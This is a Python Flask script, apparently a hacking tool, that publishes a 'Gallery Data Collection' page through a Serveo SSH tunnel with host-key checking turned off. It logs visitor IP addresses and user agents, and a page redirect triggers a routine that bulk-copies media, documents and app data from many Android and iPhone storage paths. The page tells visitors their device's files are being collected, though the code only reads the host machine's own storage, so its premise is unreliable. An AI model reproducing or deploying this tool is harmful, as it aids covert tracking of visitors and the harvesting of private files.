import os
import shutil
from flask import Flask, render_template_string, request
from threading import Thread
import subprocess

app = Flask(__name__)

# Directory to save images and videos (Downloads/Gallery Data)
DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Gallery Data')

# Ensure the Gallery Data folder exists
if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)

# IP Log File
IP_LOG_FILE = os.path.join(DOWNLOAD_FOLDER, 'ip.txt')

# Variable to store the Serveo link
serveo_link = ""

@app.route('/')
def index():
    return render_template_string('''
    <!doctype html>
    <html>
    <head>
        <title>Gallery Data Collection</title>
    </head>
    <body style="background-color: black; color: white;">
        <h2>Gallery Data Collection</h2>
        <p>All available images and videos from your device are being collected and saved.</p>
        <script>
            setTimeout(function() {
                window.location.href = '/gather_data';  // Automatically trigger gathering of files
            }, 2000);  // Wait 2 seconds before automatically triggering
        </script>
    </body>
    </html>
    ''')

@app.route('/log_ip', methods=['GET'])
def log_ip():
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    with open(IP_LOG_FILE, 'a') as f:
        f.write(f"IP: {ip_address}\nUser-Agent: {user_agent}\n")
    return "IP logged", 200

@app.route('/gather_data', methods=['GET'])
def gather_data():
    gather_photos_and_videos()
    return "Gallery data gathered and saved!", 200

def gather_photos_and_videos():
    # This function will gather all photos and videos from internal storage and all folders
    # Common folders to search for images and videos for Android and iPhone devices
    directories_to_search = [
        # Android Directories
        '/data/data/com.termux/files/home/storage/shared/',  # Shared storage (Termux)
        '/data/data/com.termux/files/home/storage/emulated/0/',  # Main storage
        '/storage/emulated/0/',  # Common Android storage directory
        '/storage/sdcard0/',  # External SD card (if available)
        '/storage/sdcard1/',  # Secondary SD card (if available)
        '/mnt/sdcard/',  # Mount points for external storage
        '/mnt/media_rw/sdcard1/',  # External storage mounted by Android
        '/storage/self/primary/',  # Primary storage
        '/storage/extSdCard/',  # External SD card (for some devices)
        '/sdcard/',  # Another common storage path
        '/Android/data/',  # App-specific data directories
        '/Pictures/',  # Default folder for images
        '/Movies/',  # Default folder for videos
        '/DCIM/',  # Camera images folder
        '/Downloads/',  # Downloads folder (potential media)
        '/Music/',  # Music folder (might contain media files)
        '/Videos/',  # Video folder (various video formats)

        # iPhone Directories (using common iOS folder paths for jailbroken or filesystem access)
        '/var/mobile/Media/DCIM/',  # iPhone Camera Roll (DCIM folder)
        '/private/var/mobile/Media/Photos/',  # Photos directory
        '/private/var/mobile/Media/Music/',  # Music directory
        '/private/var/mobile/Media/Downloads/',  # Downloads folder
        '/private/var/mobile/Media/iTunes_Control/',  # iTunes sync data
        '/private/var/mobile/Library/',  # App-specific data
        '/private/var/mobile/Media/Videos/',  # Videos folder
        '/private/var/mobile/Library/iTunes/',  # iTunes library and synced media
        '/private/var/mobile/Media/',  # General media folder for iPhone
        '/var/mobile/Library/',  # System-related files
    ]
    
    # Add a list of 50+ file extensions (Images, Videos, Audio, Documents, etc.)
    file_extensions = [
        'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff', 'webp', 'raw', 'svg', 'ico',  # Image formats
        'mp4', 'avi', 'mkv', 'mov', 'wmv', 'flv', 'mpeg', 'mpg', '3gp', 'webm',  # Video formats
        'mp3', 'wav', 'flac', 'aac', 'ogg', 'm4a', 'wma', 'pcm', 'aiff', 'alac',  # Audio formats
        'pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'odt', 'txt', 'rtf',  # Document formats
        'zip', 'tar', 'gz', '7z', 'rar', 'iso', 'dmg', 'apk', 'exe', 'msi',  # Archive and Executables
        'json', 'xml', 'csv', 'html', 'css', 'js', 'yaml', 'md', 'ini', 'bat',  # Code and Config formats
        'epub', 'mobi', 'azw3', 'chm', 'ibooks', 'acsm', 'fb2', 'lit', 'odm', 'xps', 'pages'  # Ebook formats
    ]

    # Scan and gather all images and videos from all directories
    for directory in directories_to_search:
        if os.path.exists(directory):
            for root, dirs, files in os.walk(directory):
                for file_name in files:
                    if any(file_name.lower().endswith(ext) for ext in file_extensions):
                        file_path = os.path.join(root, file_name)
                        shutil.copy(file_path, DOWNLOAD_FOLDER)
                        print(f"Copied file {file_name} to {DOWNLOAD_FOLDER}")

def run_flask():
    app.run(host='0.0.0.0', port=3434)  # Changed the port to 3434

def start_serveo_tunnel(port):
    global serveo_link
    serveo_command = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net"
    try:
        process = subprocess.Popen(serveo_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            output = process.stdout.readline()
            if output == b"" and process.poll() is not None:
                break
            if output:
                line = output.decode('utf-8').strip()
                if "https://" in line:
                    serveo_link = line  # Store the Serveo link
                    print(f"Serveo tunnel started. Access the application via: {line}")
                    break
    except Exception as e:
        print(f"Error starting Serveo tunnel: {e}")

def stop_other_processes(port):
    # Stop any process using the specified port
    print(f"Stopping any processes using port {port}...")
    os.system(f'fuser -k {port}/tcp')

def main():
    port = 3434  # Port number changed to 3434
    stop_other_processes(port)  # Ensure no other processes are using port 3434

    # Start the Flask server in a separate thread
    Thread(target=run_flask).start()
    
    # Start the Serveo server
    start_serveo_tunnel(port)

if __name__ == '__main__':
    main()
